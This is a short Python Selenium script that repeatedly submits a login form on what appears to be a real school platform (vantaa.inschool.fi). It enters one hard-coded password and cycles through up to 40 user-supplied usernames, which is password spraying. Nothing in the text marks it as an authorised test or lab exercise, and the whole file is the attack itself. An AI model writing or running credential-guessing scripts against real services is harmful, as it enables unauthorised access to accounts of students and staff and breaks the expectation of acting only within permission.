from selenium import webdriver
import time

# Function to prompt the user for the username
def ask_user_for_username():
    return input("Enter your username: ")

# Launch Chrome browser
browser = webdriver.Chrome()

# Navigate to the login page
browser.get("https://vantaa.inschool.fi/?loginfailed")

# Input the password
password_input = browser.find_element_by_id("password")
password_input.send_keys("ajajwnrks12")

for i in range(40):
    # Prompt the user for the username
    username = ask_user_for_username()

    # Input the username
    username_input = browser.find_element_by_id("login-frontdoor")
    username_input.clear()
    username_input.send_keys(username)

    # Submit the form
    submit_button = browser.find_element_by_css_selector('input[type="submit"]')
    submit_button.click()

    # Wait for 1 second before attempting the next login
    time.sleep(1)

    # Clear the input field for the username for the next attempt
    username_input.clear()

# Close the browser after all attempts
browser.quit()
